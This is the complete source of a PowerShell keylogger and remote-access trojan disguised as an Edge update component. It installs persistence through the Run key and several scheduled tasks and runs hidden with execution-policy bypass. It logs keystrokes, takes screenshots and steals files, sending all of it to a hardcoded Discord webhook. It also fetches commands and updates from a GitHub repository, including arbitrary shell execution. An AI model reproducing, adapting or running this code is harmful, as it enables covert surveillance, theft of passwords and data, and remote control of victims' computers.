param([switch]$Test, [switch]$Debug)
if (-not $Debug) { $ErrorActionPreference = "SilentlyContinue" }

# ===================== CONFIG =====================
$h1 = "https://discord.com/api/webhooks/"
$h2 = "1574502039323545742"
$h3 = "FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
$repo = "Capyvests/office-365"
$br   = "main"
# ==================================================

$hook = $h1 + $h2 + "/" + $h3

$cmdUrl  = "https://raw.githubusercontent.com/$repo/$br/cmd.txt"
$boot    = "https://raw.githubusercontent.com/$repo/$br/k.ps1"
$shutSrc = "https://raw.githubusercontent.com/$repo/$br/shut.ps1"

$dir  = "$env:LOCALAPPDATA\Microsoft\EdgeUpdateCore"
$self = "$dir\eupd.ps1"
$snd  = "$dir\eupd2.ps1"
$vbs  = "$dir\eupd.vbs"
$log  = "$dir\d.log"
$posF = "$dir\p.txt"
$cF   = "$dir\c.txt"
$tmpC = "$env:TEMP\e_c.txt"

New-Item -ItemType Directory $dir -Force | Out-Null
if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
if (-not (Test-Path $self)) { curl.exe -s -o $self $boot }
if (-not (Test-Path $snd))  { curl.exe -s -o $snd  $shutSrc }
if (-not (Test-Path $log))  { Set-Content $log "" }
if (-not (Test-Path $vbs)) {
  Set-Content $vbs @(
    'Set f = CreateObject("Scripting.FileSystemObject")'
    'p = f.GetParentFolderName(WScript.ScriptFullName)'
    's = "powershell -w hidden -ep bypass -f """ & p & "\" & WScript.Arguments(0) & """"'
    'CreateObject("WScript.Shell").Run s, 0, False'
  ) -Encoding ASCII
}

$pos = 0
if (Test-Path $posF) { $pos = [int](Get-Content $posF) }
$len0 = 0
if (Test-Path $log) { $len0 = (Get-Content $log -Raw).Length }
if (-not $len0) { $len0 = 0 }
if ($pos -gt $len0) { $pos = $len0 }

$ultimo = ""
if (Test-Path $cF) { $ultimo = (Get-Content $cF -Raw) }
if (-not $ultimo) { $ultimo = "" }

function Send($t) {
  if (-not $t) { return }
  if ($Debug) { Write-Host "SEND> $t" }
  foreach ($i in 0..([Math]::Ceiling($t.Length / 350) - 1)) {
    $c = $t.Substring($i * 350, [Math]::Min(350, $t.Length - $i * 350))
    $body = '```' + $c + '```'
    for ($r = 1; $r -le 3; $r++) {
      curl.exe -s -f --form-string "content=$body" $hook | Out-Null
      if ($LASTEXITCODE -eq 0) { break }
      Start-Sleep -Seconds 2
    }
  }
}

function MyIP {
  try {
    $i = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
    if ($i -and $i.IPv4Address) { return $i.IPv4Address.IPAddress }
    return (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -notlike '192.168.56.*' } | Select -First 1).IPAddress
  } catch { return "?" }
}

function Ident {
  $up = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
  "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $([int]$up.TotalMinutes) min`nIP: $(MyIP)"
}

function HB {
  Send "[hb] $env:COMPUTERNAME | $env:USERNAME | $(MyIP) | $((Get-CimInstance Win32_OperatingSystem).Caption)"
}

$mtx = New-Object Threading.Mutex($false, "EdgeUpdCoreMtx")
if (-not $mtx.WaitOne(0)) { exit }

if (-not $Test -and -not $Debug) {
  Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name EdgeUpdateCore -Value "wscript.exe `"$vbs`" eupd.ps1"

  $a1 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbs`" eupd.ps1"
  $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbs`" eupd2.ps1"
  Register-ScheduledTask -TaskName "EdgeUpdateCore" -Action $a1 -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
  Register-ScheduledTask -TaskName "EdgeUpdateW"    -Action $a1 -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Force | Out-Null
  Register-ScheduledTask -TaskName "EdgeUpdateS0"   -Action $a2 -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null

  $trS = "powershell -w hidden -ep bypass -f `"$snd`""
  schtasks /create /tn EdgeUpdateS1 /tr $trS /sc onevent /ec System /mo "*[System/EventID=6006]" /f 2>$null
  schtasks /create /tn EdgeUpdateS2 /tr $trS /sc onevent /ec System /mo "*[System/EventID=1074]" /f 2>$null
  schtasks /create /tn EdgeUpdateS3 /tr $trS /sc onevent /ec System /mo "*[System/EventID=107]"  /f 2>$null
  schtasks /create /tn EdgeUpdateS4 /tr $trS /sc onevent /ec System /mo "*[System/EventID=42]"   /f 2>$null

  $falta = @()
  foreach ($n in "EdgeUpdateCore","EdgeUpdateW","EdgeUpdateS0","EdgeUpdateS1","EdgeUpdateS2","EdgeUpdateS3","EdgeUpdateS4") {
    schtasks /query /tn $n >$null 2>&1
    if ($LASTEXITCODE -ne 0) { $falta += $n }
  }
  if ($falta.Count) { Send "[falha] tarefas em falta: $($falta -join ', ')" } else { Send "[ok] persistencia completa" }
}

$cs = 'using System; using System.Runtime.InteropServices; public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }'
try { Add-Type -TypeDefinition $cs } catch { Send "[erro] Add-Type :: $($_)" }
if (-not ("K" -as [type])) { Send "[erro] K nao carregou"; exit }

function Flush {
  if (-not (Test-Path $log)) { return }
  $a = Get-Content $log -Raw
  if (-not $a) { return }
  if ($pos -gt $a.Length) { $pos = 0 }
  if ($a.Length -le $pos) { return }
  $d = $a.Substring($pos)
  $f = "$env:TEMP\e_$(Get-Date -f HHmmss).txt"
  $d | Set-Content $f -Encoding UTF8
  for ($r = 1; $r -le 3; $r++) {
    curl.exe -s -f -F "content=**keylog** $env:COMPUTERNAME" -F "files[0]=@$f" $hook | Out-Null
    if ($LASTEXITCODE -eq 0) { break }
    Start-Sleep -Seconds 2
  }
  Remove-Item $f -ErrorAction SilentlyContinue
  $pos = $a.Length
  if ($a.Length -gt 200000) {
    $a = $a.Substring($a.Length - 100000)
    Set-Content $log $a -NoNewline
    $pos = $a.Length
  }
  Set-Content $posF $pos
}

function Uninstall {
  Send "[ok] uninstall"
  foreach ($t in "EdgeUpdateCore","EdgeUpdateW","EdgeUpdateS0","EdgeUpdateS1","EdgeUpdateS2","EdgeUpdateS3","EdgeUpdateS4") { schtasks /delete /tn $t /f >$null 2>&1 }
  Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name EdgeUpdateCore 2>$null
  Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
  exit
}

$map  = @{ 8='[BK]'; 9='[TAB]'; 13="`n"; 32=' '; 46='[DEL]'; 27='[ESC]' }
$prev = New-Object 'bool[]' 256
$logOn = $true
$live  = $false
$hbOn  = $true
$tUlt  = Get-Date
$tHb   = Get-Date
$tErro = (Get-Date).AddMinutes(-11)

if ($Test -or $Debug) { Send "[i] up $env:COMPUTERNAME" }
if ($hbOn) { HB }

while ($true) {
  try {
    Remove-Item $tmpC -ErrorAction SilentlyContinue
    curl.exe -s -f -o $tmpC "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" 2>$null
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $tmpC)) {
      if (((Get-Date) - $tErro).TotalMinutes -gt 10) {
        $tErro = Get-Date
        Send "[falha] fetch cmd :: curl $LASTEXITCODE"
      }
      if ($Debug) { Write-Host "FETCH FALHOU $LASTEXITCODE" }
    } else {
      $c = Get-Content $tmpC -Raw
      if ($c -and $c -ne $ultimo) {
        Set-Content $cF $c -NoNewline
        $ultimo = $c

        $cfg = @{}
        foreach ($l in ($c -split "`n")) {
          $l = $l.Trim()
          if (-not $l) { continue }
          if ($l.StartsWith("#")) { continue }
          $i = $l.IndexOf("=")
          if ($i -lt 1) { continue }
          $k = $l.Substring(0, $i).Trim().ToLower()
          $v = $l.Substring($i + 1).Trim()
          if ($v.StartsWith("$k=")) { $v = $v.Substring($k.Length + 1).Trim() }
          $cfg[$k] = $v
        }
        function Flag($n) { $cfg[$n] -eq "1" }

        if (Flag "ping") { Send "[ok] ping" }
        if ((Flag "who") -or (Flag "info")) { try { Send "[who]`n$(Ident)" } catch { Send "[falha] who :: $($_)" } }
        if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falha] dump :: $($_)" } }

        if (Flag "ls") {
          try {
            $p = $cfg["ls_path"]; if (-not $p) { throw "ls_path vazio" }
            Send "[ok] ls $p`n$((Get-ChildItem $p | Select -First 40 Name,Length | Out-String))"
          } catch { Send "[falha] ls :: $($cfg['ls_path']) :: $($_)" }
        }

        if (Flag "get") {
          try {
            $p = $cfg["get_path"]; if (-not $p) { throw "get_path vazio" }
            if (-not (Test-Path $p)) { throw "nao existe" }
            curl.exe -s -f --form-string "content=**ok** get $p" -F "files[0]=@$p" $hook | Out-Null
            Send "[ok] get $p"
          } catch { Send "[falha] get :: $($cfg['get_path']) :: $($_)" }
        }

        if (Flag "shot") {
          try {
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bmp = New-Object Drawing.Bitmap $b.Width, $b.Height
            $g = [Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
            $p = "$env:TEMP\e.png"
            $bmp.Save($p, [Drawing.Imaging.ImageFormat]::Png)
            curl.exe -s -f -F "content=**shot** $env:COMPUTERNAME" -F "files[0]=@$p" $hook | Out-Null
            Send "[ok] shot"
          } catch { Send "[falha] shot :: $($_)" }
        }

        if (Flag "sh") {
          try {
            if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
            Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
          } catch { Send "[falha] sh :: $($cfg['sh_cmd']) :: $($_)" }
        }

        if (Flag "shut") { try { & $snd; Send "[ok] shut" } catch { Send "[falha] shut :: $($_)" } }

        if (Flag "webhook") {
          try { if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }; $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado" }
          catch { Send "[falha] webhook :: $($_)" }
        }

        if (Flag "reboot") { try { Send "[ok] reboot"; Restart-Computer -Force } catch { Send "[falha] reboot :: $($_)" } }
        if (Flag "sleep")  { try { Send "[ok] sleep"; rundll32.exe powrprof.dll,SetSuspendState 0,1,0 } catch { Send "[falha] sleep :: $($_)" } }

        if (Flag "update") {
          try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $snd $shutSrc; Set-Content $cF $c -NoNewline; Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
          catch { Send "[falha] update :: $($_)" }
        }

        if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
        if ($cfg["live"] -eq "1") { $live = $true } elseif ($cfg["live"] -eq "0") { $live = $false }
        if ($cfg["hb"] -eq "1") { $hbOn = $true } elseif ($cfg["hb"] -eq "0") { $hbOn = $false }

        if (Flag "uninstall") { Uninstall }
      }
    }
  } catch { if ($Debug) { Write-Host "LOOP FALHOU: $($_)" } }

  if ($logOn) {
    Start-Sleep -Milliseconds 12
    for ($k = 8; $k -lt 256; $k++) {
      try { $d = ([K]::GetAsyncKeyState($k) -band 0x8000) -ne 0 } catch { $d = $false }
      if ($d -and -not $prev[$k]) {
        $ch = $null
        if ($map.ContainsKey($k)) { $ch = $map[$k] }
        elseif ($k -ge 32 -and $k -le 126) {
          $ch = [char]$k
          if ((([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0) -bxor [Console]::CapsLock) {
            if ([char]::IsLetter($ch)) { $ch = [char]::ToUpper($ch) }
          }
        }
        if ($ch) { Add-Content $log $ch -NoNewline; $tUlt = Get-Date; if ($Debug) { Write-Host -NoNewline $ch } }
      }
      $prev[$k] = $d
    }
  } else { Start-Sleep -Milliseconds 800 }

  if ($hbOn -and ((Get-Date) - $tHb).TotalMinutes -gt 20) { HB; $tHb = Get-Date }
  if ($live -and $logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 30) { Flush; $tUlt = Get-Date }
}
